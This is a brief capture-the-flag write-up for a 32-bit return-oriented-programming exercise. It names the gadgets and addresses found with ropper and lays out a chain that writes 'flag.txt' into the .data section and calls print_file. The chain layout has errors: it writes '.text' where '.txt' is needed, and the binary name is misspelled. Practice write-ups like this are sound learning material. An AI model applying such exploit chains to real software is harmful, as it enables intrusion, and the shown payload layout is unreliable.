# writeup

- our goal for this challenge is to find a way to write "flag.txt" into memory and call print_file on it.
- We will be writing into the .data section in memory

*readelf -S* gives us the sections in the binary, we can also use *iS* in r2 which will show us the sections and which ones we can write to .

- we need a gadget which we will use to move data between registers, and to the .data section
- From the challenge hints, we are told of the mov gadget

*ropper -f write42* we get the gadget `0x08048543: mov dword ptr [edi], ebp; ret; `

- We will also need pop gadgets that will be used to pop values into the edi and ebp

*ropper -f write432 --search pop* gives us `0x080485aa: pop edi; pop ebp; ret;`

- Memory addresses of important functions

* 0x080483d0 - sym.imp.print_file
* .data = 0x0804a018
* pop_gadget = 0x080485aa
* mov_gadget = 0x08048543

- We use pop edi to place the value of the .data section into the edi register.
- We will use pop ebp to place our first 4 byte value into the .data section (flag)
- We then increment the value of the edi by 4 so as not to overwrite the first 4 bytes.
- pop ebp for the last 4 bytes 
- We then call print_file on the .data section

# structure

padding(44)
pop_gadget 
.data
"flag" 
mov_gadget 


pop_gadget 
.data + 4
".text" 
mov_gadget 

print_file
return_p(4 bytes)
data_addr



